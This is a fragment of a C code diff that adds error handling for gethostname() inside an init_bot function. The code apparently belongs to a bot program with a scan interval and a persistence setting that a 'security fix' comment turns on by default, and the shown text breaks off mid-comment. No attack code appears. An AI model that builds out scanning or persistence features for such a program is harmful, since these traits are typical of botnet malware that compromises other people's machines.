@@ -79,7 +79,10 @@ static int init_bot(void) {
     
     /* Self-identification */
     char hostname_buf[BOT_MAX_HOSTNAME_LEN];
-    gethostname(hostname_buf, sizeof(hostname_buf));
+    if (gethostname(hostname_buf, sizeof(hostname_buf)) != 0) {
+        log_warn("gethostname() failed; using default hostname");
+        snprintf(hostname_buf, sizeof(hostname_buf), "%s", "unknown");
+    }
     snprintf(g_bot.hostname, BOT_MAX_HOSTNAME_LEN, "%s", hostname_buf);
     g_bot.scan_interval = SCAN_SLEEP_SEC;
     /* SECURITY FIX (#84): Default to persistence ON. Set persist_enabled=0
